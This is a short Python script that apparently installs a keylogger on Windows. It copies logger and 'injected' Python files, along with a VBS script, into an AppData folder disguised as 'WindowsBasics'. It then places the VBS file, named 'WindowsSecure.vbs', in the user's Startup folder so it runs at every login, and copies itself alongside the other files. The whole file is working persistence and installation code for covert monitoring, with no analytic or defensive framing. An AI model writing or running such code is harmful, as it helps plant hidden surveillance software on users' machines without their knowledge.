import os
import shutil
from pathlib import Path

def create_folder(folder_path):
    try:
        os.makedirs(folder_path, exist_ok=True)
        print(f"Folder '{folder_path}' created successfully.")
    except FileExistsError:
        print(f"Folder '{folder_path}' already exists.")

def copy_files(source, destination):
    try:
        shutil.copy(source, destination)
        print(f"File '{source}' copied successfully to '{destination}'.")
    except FileNotFoundError as e:
        print(f"Error: {e}")

def add_to_startup(file_path):
    startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    try:
        shutil.copy(file_path, startup_folder)
        print(f"File '{file_path}' added to startup.")
    except FileNotFoundError as e:
        print(f"Error: {e}")

def main():
    user = os.getlogin()
    injected_file = "loggerinjected.py"
    secure_file = "WindowsSecure.vbs"
    logger_file = "logger.py"
    getpip_file = "getpip.py"
    folder_name = "WindowsBasics"
    
    source_directory = Path(__file__).resolve().parent
    destination_directory = Path.home() / 'AppData' / 'Roaming' / folder_name

    create_folder(destination_directory)

    source_injected_path = source_directory / injected_file
    source_secure_path = source_directory / secure_file
    source_logger_path = source_directory / logger_file
    source_getpip_path = source_directory / getpip_file 
    
    destination_injected_path = destination_directory / injected_file
    destination_secure_path = destination_directory / secure_file
    destination_logger_path = destination_directory / logger_file
    destination_getpip_path = destination_directory / getpip_file  

    copy_files(source_injected_path, destination_injected_path)
    copy_files(source_secure_path, destination_secure_path)
    copy_files(source_logger_path, destination_logger_path)
    copy_files(source_getpip_path, destination_getpip_path) 

    add_to_startup(destination_secure_path)

    current_script_file = Path(__file__).resolve()
    copied_script_file = destination_directory / current_script_file.name
    copy_files(current_script_file, copied_script_file)

if __name__ == "__main__":
    main()
